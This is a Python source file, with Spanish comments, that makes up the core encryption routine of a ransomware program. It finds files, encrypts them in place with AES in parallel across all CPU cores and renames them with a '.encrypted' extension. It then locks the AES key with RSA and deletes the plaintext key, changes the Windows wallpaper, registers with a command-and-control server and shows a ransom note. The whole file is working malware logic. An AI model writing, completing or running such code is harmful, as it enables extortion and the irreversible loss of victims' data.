import os
import ctypes
import multiprocessing
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from find_files import find_files
import gen_keys
import agent
import ransom_note

def load_aes_key():
    ruta_clave = os.path.abspath("aes_key.bin")
    with open(ruta_clave, "rb") as clave_file:
        return clave_file.read()

def encrypt_aes_key(aes_key):
    gen_keys.generate_rsa_key()
    with open("rsa_public.pem", "rb") as f:
        rsa_public_key = RSA.import_key(f.read())
    cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
    aes_key_encrypted = cipher_rsa.encrypt(aes_key)
    with open("aes_key_encrypted.bin", "wb") as f:
        f.write(aes_key_encrypted)

def encrypt_file(file, aes_key):
    try:
        iv = os.urandom(16)  # Vector de inicialización
        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        with open(file, "rb") as f:
            datos = f.read()
        datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
        with open(file, "wb") as f:
            f.write(iv + datos_cifrados)  
        encrypted_file = file + ".encrypted"
        os.rename(file, encrypted_file)  # Renombrar el archivo con extensión personalizada
        print(f"Archivo cifrado: {file}->{encrypted_file}")
    except Exception as e:
        print(f"Error cifrando {file}: {e}")

def encrypt_files():
    gen_keys.generate_aes_key()  # Generar clave simétrica
    aes_key = load_aes_key()  # Cargar la clave simétrica
    files = find_files()  # Obtener lista de archivos a cifrar
    with multiprocessing.Pool(processes=os.cpu_count()) as pool:
        pool.starmap(encrypt_file, [(file, aes_key) for file in files])
    print("Archivos cifrados correctamente.")
    encrypt_aes_key(aes_key)  # Se cifra la clave AES con RSA
    os.remove("aes_key.bin")  # Eliminar clave simétrica sin cifrar
    change_background() # Cambiar fondo de pantalla
    agent.register_agent()  # Registrar agente en comando y control
    ransom_note.show_ransom_note()
    agent.connect_to_server()

def change_background():
    image_path = os.path.abspath("background_image/background.png")
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)